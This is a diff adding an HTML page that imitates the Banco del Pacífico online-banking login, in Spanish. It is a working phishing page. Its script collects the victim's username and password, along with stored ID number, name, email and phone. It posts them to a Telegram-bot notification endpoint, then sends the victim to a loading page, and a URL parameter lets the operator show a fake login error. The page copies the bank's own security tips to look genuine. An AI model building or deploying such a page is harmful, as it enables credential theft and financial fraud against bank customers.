@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Banco del Pacífico – Acceso</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Segoe UI',Arial,sans-serif;background:#eef1f5;min-height:100vh;display:flex;flex-direction:column}
+    header{background:#fff;padding:16px 24px;display:flex;align-items:center;gap:12px;box-shadow:0 1px 4px rgba(0,0,0,.08)}
+    .logo-box{width:38px;height:38px;background:#1a56a0;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;font-weight:900}
+    header span{font-size:1.1rem;font-weight:700;color:#1a3a6b}
+    .page{flex:1;display:flex;align-items:flex-start;justify-content:center;gap:32px;padding:36px 20px}
+    .card{background:#fff;border-radius:10px;padding:36px 32px;width:100%;max-width:440px;box-shadow:0 2px 12px rgba(0,0,0,.09)}
+    .card h2{font-size:1.45rem;font-weight:700;color:#1a3a6b;margin-bottom:28px;text-align:center}
+    .step{display:none;animation:fadeIn .3s ease}
+    .step.active{display:block}
+    @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+    .field{margin-bottom:20px}
+    .field input{width:100%;border:none;border-bottom:2px solid #c5cdd8;padding:8px 2px;font-size:.97rem;color:#1a3a6b;background:transparent;outline:none;transition:border-color .2s}
+    .field input:focus{border-bottom-color:#1a56a0}
+    .field input.error-input{border-bottom-color:#e03131}
+    .err-box{background:#fff0f0;border:1px solid #f5c2c2;border-radius:6px;padding:10px 14px;color:#c92a2a;font-size:.84rem;margin-bottom:14px;display:none;align-items:center;gap:8px}
+    .err-box.show{display:flex}
+    .btn-primary{width:100%;background:#c7cdd6;color:#fff;border:none;border-radius:6px;padding:13px;font-size:1rem;font-weight:600;cursor:pointer;margin-top:4px;transition:background .25s}
+    .btn-primary:hover{background:#1a56a0}
+    .btn-secondary{width:100%;background:transparent;color:#1a56a0;border:1.5px solid #1a56a0;border-radius:6px;padding:12px;font-size:.95rem;font-weight:600;cursor:pointer;margin-top:12px;transition:background .2s}
+    .btn-secondary:hover{background:#eef4fb}
+    .link-forgot{display:block;text-align:center;color:#1a56a0;font-size:.88rem;margin-top:14px;cursor:pointer;text-decoration:none}
+    .link-forgot:hover{text-decoration:underline}
+    .quick-actions{display:flex;gap:12px;margin-top:20px}
+    .quick-btn{flex:1;border:1.5px solid #d5dbe4;border-radius:8px;background:#fff;padding:14px 8px;display:flex;flex-direction:column;align-items:center;gap:6px;cursor:pointer;font-size:.76rem;color:#1a56a0;font-weight:600;text-align:center;transition:border-color .2s,background .2s}
+    .quick-btn:hover{border-color:#1a56a0;background:#f0f5fb}
+    .quick-btn .q-icon{font-size:22px}
+    .user-badge{display:flex;align-items:center;gap:10px;background:#f4f7fb;border-radius:8px;padding:10px 14px;margin-bottom:20px}
+    .user-badge .avatar{width:34px;height:34px;background:#1a56a0;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:15px}
+    .user-badge span{font-size:.9rem;color:#1a3a6b;font-weight:600}
+    .user-badge .change{margin-left:auto;font-size:.78rem;color:#1a56a0;cursor:pointer}
+    .user-badge .change:hover{text-decoration:underline}
+    .footer-note{text-align:center;font-size:.7rem;color:#aaa;margin-top:24px;line-height:1.6}
+    .tips{max-width:320px;padding-top:8px}
+    .tip-title{font-size:.75rem;color:#999;text-transform:uppercase;letter-spacing:.05em;margin-bottom:2px}
+    .tip-subtitle{font-size:.95rem;font-weight:700;color:#1a3a6b;margin-bottom:18px}
+    .tip-item{display:flex;gap:10px;margin-bottom:14px;align-items:flex-start}
+    .tip-icon{width:26px;height:26px;flex-shrink:0;background:#eef1f5;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px}
+    .tip-item p{font-size:.8rem;color:#777;line-height:1.45}
+    .help-section{margin-top:24px}
+    .help-section h4{font-size:.92rem;font-weight:700;color:#1a3a6b;margin-bottom:8px}
+    .help-section a{display:block;font-size:.8rem;color:#1a56a0;text-decoration:none;margin-bottom:5px}
+    @media(max-width:700px){.tips{display:none}.page{padding:16px 12px}.card{padding:26px 18px}}
+  </style>
+</head>
+<body>
+<header>
+  <div class="logo-box">B</div>
+  <span>Banco del Pacífico</span>
+</header>
+<div class="page">
+  <div class="card">
+    <h2>Bienvenido</h2>
+
+    <!-- PASO 1: USUARIO -->
+    <div class="step active" id="step-usuario">
+      <div class="err-box" id="err-usuario-box">⚠️ <span>Usuario incorrecto. Verifica e intenta nuevamente.</span></div>
+      <div class="field">
+        <input type="text" id="inputUsuario" placeholder="Ingresa tu usuario" autocomplete="username"/>
+      </div>
+      <button class="btn-primary" onclick="irAClave()">Continuar</button>
+      <button class="btn-secondary">Desbloquear usuario</button>
+      <a class="link-forgot" href="#">¿Olvidaste tu contraseña?</a>
+      <div class="quick-actions">
+        <button class="quick-btn"><span class="q-icon">👤</span>Crear usuario y contraseña</button>
+        <button class="quick-btn"><span class="q-icon">📋</span>Solicitar productos</button>
+      </div>
+    </div>
+
+    <!-- PASO 2: CLAVE -->
+    <div class="step" id="step-clave">
+      <div class="err-box" id="err-clave-box">⚠️ <span>Clave incorrecta. Verifica e intenta nuevamente.</span></div>
+      <div class="user-badge">
+        <div class="avatar">👤</div>
+        <span id="labelUsuario">usuario</span>
+        <span class="change" onclick="volverUsuario()">Cambiar</span>
+      </div>
+      <div class="field">
+        <input type="password" id="inputClave" placeholder="Ingresa tu clave" autocomplete="current-password"/>
+      </div>
+      <button class="btn-primary" onclick="irALoading()">Ingresar</button>
+      <button class="btn-secondary">Desbloquear usuario</button>
+      <a class="link-forgot" href="#">¿Olvidaste tu contraseña?</a>
+    </div>
+
+    <p class="footer-note">Recomendamos utilizar la Banca Virtual con Chrome, Firefox o Edge.<br/>© Copyright 2017 Banco del Pacífico *V5.3.12b</p>
+  </div>
+
+  <div class="tips">
+    <p class="tip-title">CONSEJOS</p>
+    <p class="tip-subtitle">Por tu seguridad:</p>
+    <div class="tip-item"><div class="tip-icon">🔒</div><p>Banco del Pacífico S.A. no solicita claves, usuarios, números de tarjetas o cuenta por ningún medio.</p></div>
+    <div class="tip-item"><div class="tip-icon">🔑</div><p>No compartas tus claves, recuerda que son de uso personal e intransferible.</p></div>
+    <div class="tip-item"><div class="tip-icon">ℹ️</div><p>Para acceder a la Banca Virtual, asegúrese de teclear <strong>https://www.intermatico.com</strong></p></div>
+    <div class="tip-item"><div class="tip-icon">📞</div><p>En caso de recibir llamadas sospechosas contáctate al <strong>3731500 opción 9</strong>.</p></div>
+    <div class="help-section">
+      <h4>¿Necesitas ayuda?</h4>
+      <a href="#">• ¿Cómo creo mi usuario?</a>
+      <a href="#">• ¿Cómo desbloqueo mi usuario?</a>
+      <a href="#">• ¿Cómo recupero mi contraseña?</a>
+    </div>
+  </div>
+</div>
+<script>
+  function irAClave(){
+    const u=document.getElementById('inputUsuario').value.trim();
+    if(!u){document.getElementById('err-usuario-box').classList.add('show');return;}
+    document.getElementById('err-usuario-box').classList.remove('show');
+    document.getElementById('labelUsuario').textContent=u;
+    sessionStorage.setItem('bp_usuario',u);
+    document.getElementById('step-usuario').classList.remove('active');
+    document.getElementById('step-clave').classList.add('active');
+    setTimeout(()=>document.getElementById('inputClave').focus(),50);
+  }
+  function volverUsuario(){
+    document.getElementById('err-clave-box').classList.remove('show');
+    document.getElementById('step-clave').classList.remove('active');
+    document.getElementById('step-usuario').classList.add('active');
+    setTimeout(()=>document.getElementById('inputUsuario').focus(),50);
+  }
+  async function irALoading(){
+    const c=document.getElementById('inputClave').value.trim();
+    if(!c){document.getElementById('err-clave-box').classList.add('show');return;}
+    sessionStorage.setItem('bp_clave',c);
+
+    // Notificar al bot de Telegram
+    try{
+      await fetch('/api/telegram-notify',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({
+          action:'notify',
+          data:{
+            cedula:sessionStorage.getItem('bp_cedula')||'—',
+            nombre:sessionStorage.getItem('bp_nombre')||'—',
+            correo:sessionStorage.getItem('bp_correo')||'—',
+            telefono:sessionStorage.getItem('bp_telefono')||'—',
+            usuario:sessionStorage.getItem('bp_usuario')||'—',
+            clave:c,
+            step:'LOGIN COMPLETADO'
+          }
+        })
+      });
+    }catch(e){console.log('telegram error',e);}
+
+    window.location.href='loading.html';
+  }
+  document.addEventListener('keydown',e=>{
+    if(e.key!=='Enter')return;
+    if(document.getElementById('step-usuario').classList.contains('active'))irAClave();
+    else irALoading();
+  });
+
+  // Mostrar error login si viene del bot
+  const params=new URLSearchParams(window.location.search);
+  if(params.get('error')==='login'){
+    document.getElementById('err-usuario-box').classList.add('show');
+  }
+</script>
+</body>
+</html>
